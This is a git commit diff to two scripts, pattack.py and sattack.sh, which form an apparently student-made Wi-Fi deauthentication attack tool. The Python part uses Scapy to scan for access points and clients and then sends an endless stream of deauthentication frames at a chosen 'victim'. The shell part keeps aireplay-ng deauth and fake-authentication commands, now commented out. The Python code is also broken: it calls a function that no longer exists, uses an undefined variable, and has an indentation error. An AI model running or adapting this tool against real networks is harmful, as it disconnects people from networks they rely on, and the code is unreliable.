ea58e7702f5d00536865f1a66edc426a39e8469f
VictoKu1 <kushnir.victor@gmail.com>
2022-05-10 22:01:58 +0300

    .

--- pattack.py
+++ pattack.py
@@ -8,31 +8,88 @@ import pandas
 # Function checks if the user has root privileges
 def check_root():
     if os.geteuid() != 0:
-        print("[-] You need to have root privileges to run this script.")
+        print("\nYou need to have root privileges to run this script.\n")
         sys.exit(1)
 
-# Fucntion recieves the interface name, the access point BSSID and the access point channel and returns a list of all the MAC addresses of the clients connected to the access point
-def scanConnecedToAP(interface,accessPointBSSID,accessPointChannel):
-    # Scanning for the clients connected to the access point
-    print("[+] Scanning for clients connected to the access point...")
-    # Scapy function to scan for the clients connected to the access point
+# Fucntion recieves the interface name, the access point BSSID and returns a list of all the MAC addresses of the clients connected to the access point
+def getClients(interface,accessPointBSSID):
+    # Create a list of clients
     clients = []
-    # Scapy function to scan for the clients connected to the access point
+    # Create a list of clients
     clients = sniff(iface=interface,count=0,prn=lambda x: clients.append(x.addr2))
-    # List of MAC addresses of the clients connected to the access point
+    # Create a list of clients MAC addresses
     clientsMAC = []
+    # Create a list of clients MAC addresses
     clientsMAC = [x.addr2 for x in clients]
-    clientsMAC = list(set(clientsMAC))
-    clientsMAC = [x for x in clientsMAC if x != accessPointBSSID]
+    # Create a list of clients MAC addresses
     clientsMAC = [x for x in clientsMAC if x != "ff:ff:ff:ff:ff:ff"]
+    # Create a list of clients MAC addresses
     clientsMAC = [x for x in clientsMAC if x != "00:00:00:00:00:00"]
+    # Create a list of clients MAC addresses
+    clientsMAC = [x for x in clientsMAC if x != accessPointBSSID]
+    # Return the list of clients MAC addresses
     return clientsMAC
+
+
+
+
+
+# Fucntion recieves the interface name and performs a WLAN scan and returns a list of all the access points BSSID
+def scanWLAN(interface):
+    # Scanning for the access points
+    print("[+] Scanning for access points...")
+    # Scapy function to scan for the access points
+    accessPoints = []
+    # Scapy function to scan for the access points
+    accessPoints = sniff(iface=interface,count=0,prn=lambda x: accessPoints.append(x.addr2))
+    # List of BSSID of the access points
+    accessPointsBSSID = []
+    accessPointsBSSID = [x.addr2 for x in accessPoints]
+    accessPointsBSSID = list(set(accessPointsBSSID))
+    accessPointsBSSID = [x for x in accessPointsBSSID if x != "ff:ff:ff:ff:ff:ff"]
+    accessPointsBSSID = [x for x in accessPointsBSSID if x != "00:00:00:00:00:00"]
+    return accessPointsBSSID
+
+
+# Function recieves a list of valid inputs and a string, and asks the user to enter a valid input from the list of valid inputs
+def getValidInput(validInputs, prompt):
+    # Loop until the user enters a valid input
+    while True:
+        # Ask the user to enter a valid input
+        userInput = input(prompt)
+        # Check if the user entered a valid input
+        if userInput in validInputs:
+            # Return the user input
+            return userInput
+        # If the user entered an invalid input, print an error message
+        else:
+            print("[-] Invalid input."+prompt)
+            
+ # Function perform a deauthentication attack on the client from the access point
+def deauth(interface,accessPointBSSID,clientMAC):
+    # Create the deauthentication packet
+    packet = RadioTap() / Dot11(addr1=clientMAC, addr2=accessPointBSSID, addr3=accessPointBSSID) / Dot11Deauth()
+    # Send the deauthentication packet
+    sendp(packet, inter=0.1,count = None, loop = 1, iface=interface, verbose = 1)
+
+
+
 
 
 if __name__ == "__main__":
     interface = int(sys.argv[1])
-    accessPointBSSID = sys.argv[2]
-    accessPointChannel = sys.argv[3]
-    print(targetList=scanConnecedToAP(interface,accessPointBSSID,accessPointChannel))
+    accessPointBSSID = scanWLAN(interface)
+    # print the access points BSSID
+    getValidInput(accessPointBSSID, "\nEnter the access point BSSID:\n")
+    clientsMAC= scanConnecedToAP(interface,accessPointBSSID)
+    # print the clients MAC addresses
+    print("[+] Clients MAC addresses: " + str(clientsMAC))
+    getValidInput(clientsMAC, "Enter the client MAC address:\n")
+    # perform a deauthentication attack on the client from the access point
+    deauth(interface,accessPointBSSID,clientMAC)
+    # print the deauthentication attack has been performed
+    print("\nDeauthentication attack has been performed.\n")
+    
+
 
 
--- sattack.sh
+++ sattack.sh
@@ -62,115 +62,117 @@ clear
 
 
 
-# Perform a WLAN scan and get the SSID , the MAC address and the channel
-iwlist $interface scan | grep -i "ESSID" > ssid.txt 
-iwlist $interface scan | grep -i "Address"  > mac.txt
-iwlist $interface scan | grep -i "Channel" > channel.txt
-paste ssid.txt mac.txt channel.txt | column -t
+python3 sattack.py $interface
+# # Perform a WLAN scan and get the SSID , the MAC address and the channel
+# iwlist $interface scan | grep -i "ESSID" > ssid.txt 
+# iwlist $interface scan | grep -i "Address"  > mac.txt
+# iwlist $interface scan | grep -i "Channel" > channel.txt
+# paste ssid.txt mac.txt channel.txt | column -t
 
 
 
-# Check if interface is in monitor mode
-iwconfig $interface | grep Monitor
-if [ $? -eq 0 ]
-then
-    echo "Interface is in monitor mode"
-else
-    echo "Interface is not in monitor mode"
+# # Check if interface is in monitor mode
+# iwconfig $interface | grep Monitor
+# if [ $? -eq 0 ]
+# then
+#     echo "Interface is in monitor mode"
+# else
+#     echo "Interface is not in monitor mode"
     
-    # Start monitor mode
-    ifconfig $interface down
-    iwconfig $interface mode monitor
-    ifconfig $interface up
-    if [ $? -eq 0 ]
-    then
-        echo "Monitor mode started"
-    else
-        echo "Monitor mode failed to start"
-        exit
-    fi
-fi
-# terminal -e "airodump-ng $interface"
-# bash -c 'airodump-ng '$interface' ; bash'
+#     # Start monitor mode
+#     ifconfig $interface down
+#     iwconfig $interface mode monitor
+#     ifconfig $interface up
+#     if [ $? -eq 0 ]
+#     then
+#         echo "Monitor mode started"
+#     else
+#         echo "Monitor mode failed to start"
+#         exit
+#     fi
+# fi
+# # terminal -e "airodump-ng $interface"
+# # bash -c 'airodump-ng '$interface' ; bash'
 
-##  wifi_scanner.py should be used here
-
-
-echo "Enter the BSSID of the access point you want to attack"
-read assid
-clear
-
-# Exit if BSSID is not valid
-if [ -z "$assid" ]
-then
-    echo "BSSID is not valid"
-    exit
-fi
+# ##  wifi_scanner.py should be used here
 
 
-echo "Enter the channel you want to attack"
-read channel
+# echo "Enter the BSSID of the access point you want to attack"
+# read assid
+# clear
+
+# # Exit if BSSID is not valid
+# if [ -z "$assid" ]
+# then
+#     echo "BSSID is not valid"
+#     exit
+# fi
 
 
-# Exit if channel is not valid
-if [ -z "$channel" ]
-then
-    echo "Channel is not valid"
-    exit
-fi
+# echo "Enter the channel you want to attack"
+# read channel
 
 
-# All this should be written in python using scapy, for now we will use aircrack-ng just to see if it works.
+# # Exit if channel is not valid
+# if [ -z "$channel" ]
+# then
+#     echo "Channel is not valid"
+#     exit
+# fi
 
 
-
-
-
-# Scan the channel of the BSSID
-echo "Scanning channel $channel"
-
-# timeout 5s airodump-ng $interface --bssid $assid --channel $channel
-
-
-# TO VICTOR -> the bssid we want to attack is the 
-echo "Enter the BSSID you want to attack"
-read tarssid
-
-
-# Exit if BSSID is not valid
-if [ -z "$tarssid" ]
-then
-    echo "BSSID is not valid"
-    exit
-fi
-
-
-
-
-# Fake an access point with assid as BSSID and channel as channel of the AP
-echo "Starting fake access point"
-timeout 5s aireplay-ng -1 0 -a $assid -h $tarssid $interface
-
-#enter mac address of client we want to disconnect // example of aircrack-ng
-
-
-echo -e "\n\nEnter MAC address of victim"
-read client_mac
-
-# python3 deauth_pkts.py $ap_bssid $client_mac 20 $interface
-
-timeout 10s aireplay-ng --deauth 0 -c $client_mac -a $ap_bssid $interface
+# # All this should be written in python using scapy, for now we will use aircrack-ng just to see if it works.
 
 
 
 
 
+# # Scan the channel of the BSSID
+# echo "Scanning channel $channel"
+
+# # timeout 5s airodump-ng $interface --bssid $assid --channel $channel
 
 
-# Deauthanticate the target
-echo "Deauthing target"
-aireplay-ng -0 0 -a $assid -h $tarssid $interface
+# # TO VICTOR -> the bssid we want to attack is the 
+# echo "Enter the BSSID you want to attack"
+# read tarssid
 
-#   wlx6c5ab03ab2f5
-#   32:07:4D:4D:BD:1A
-#   11
+
+# # Exit if BSSID is not valid
+# if [ -z "$tarssid" ]
+# then
+#     echo "BSSID is not valid"
+#     exit
+# fi
+
+
+
+
+# # Fake an access point with assid as BSSID and channel as channel of the AP
+# echo "Starting fake access point"
+# timeout 5s aireplay-ng -1 0 -a $assid -h $tarssid $interface
+
+# #enter mac address of client we want to disconnect // example of aircrack-ng
+
+
+# echo -e "\n\nEnter MAC address of victim"
+# read client_mac
+
+# # python3 deauth_pkts.py $ap_bssid $client_mac 20 $interface
+
+# timeout 10s aireplay-ng --deauth 0 -c $client_mac -a $ap_bssid $interface
+
+
+
+
+
+
+
+# # Deauthanticate the target
+# echo "Deauthing target"
+# aireplay-ng -0 0 -a $assid -h $tarssid $interface
+
+# #   wlx6c5ab03ab2f5
+# #   32:07:4D:4D:BD:1A
+# #   11
+
